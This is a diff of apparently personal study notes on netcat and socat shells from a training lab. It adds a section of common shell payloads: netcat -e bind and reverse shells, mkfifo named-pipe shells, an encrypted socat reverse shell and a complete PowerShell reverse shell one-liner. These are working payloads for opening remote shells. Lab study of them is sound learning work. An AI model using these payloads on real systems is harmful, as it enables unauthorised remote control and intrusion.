@@ -63,7 +63,6 @@ Here we are using netcat to make an outbound connection to the target on our cho
 
 ## **Netcat Shell Stabilisation**
 These shells are very unstable by default. Pressing Ctrl + C kills the whole thing. They are non-interactive, and often have strange formatting errors. This is due to netcat "shells" really being processes running _inside_ a terminal, rather than being bonafide terminals in their own right. Fortunately, there are many ways to stabilise netcat shells on Linux systems. We'll be looking at three here. Stabilisation of Windows reverse shells tends to be significantly harder; however, the second technique that we'll be covering here is particularly useful for it.
-
 ### _Technique 1: Python_
 1. The first thing to do is use `python -c 'import pty;pty.spawn("/bin/bash")'`, which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace `python` with `python2` or `python3` as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
 2. Step two is: `export TERM=xterm` -- this will give us access to term commands such as `clear`.
@@ -197,3 +196,33 @@ Q) If your IP is 10.10.10.5, what syntax would you use to connect back to this l
 
 - encrypted using openssl:
   `socat OPENSSL:10.10.10.5:53,verify=0 EXEC:”bash -li”, pty, stderr, sigint, setsid, sane`
+
+## **Common Shell Payloads**
+ In some versions of netcat (including the `nc.exe` Windows version included with Kali at `/usr/share/windows-resources/binaries`, and the version used in Kali itself: `netcat-traditional`) there is a `-e` option which allows you to execute a process on connection. For example, as a listener:
+
+	`nc -lvnp <PORT> -e /bin/ bash`
+
+Connecting to the above listener with netcat would result in a bind shell on the target. Equally, for a reverse shell, connecting back with `nc <LOCAL-IP> <PORT> -e /bin/bash` would result in a reverse shell on the target. This is however seen as being very insecure, and it is not included in most version of netcat. On Windows where a static binary is nearly always required anyway, this technique will work perfectly. On Linux, however, we would instead use this code to create a listener for a bind shell:
+
+	mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+
+The command first creates a [named pipe](https://www.linuxjournal.com/article/2156) at `/tmp/f`. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into `sh`, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle.
+
+![[Pasted image 20240818163208.png]]
+
+
+A very similar command can be used to send a netcat reverse shell:
+
+	`mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
+
+This command is virtually identical to the previous one, other than using the netcat connect syntax, as opposed to the netcat listen syntax.
+
+![[Pasted image 20240818163443.png]]
+
+
+When targeting a modern version of Windows Server, we can use the following Powershell reverse shell:
+	`powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
+
+In order to use this, we need to replace `<IP>` and `<port>` with an appropriate IP and choice of port. It can then be copied into a cmd.exe shell (or another method of executing commands on a Windows server, such as a webshell) and executed, resulting in a reverse shell:
+![[Pasted image 20240818163651.png]]
+
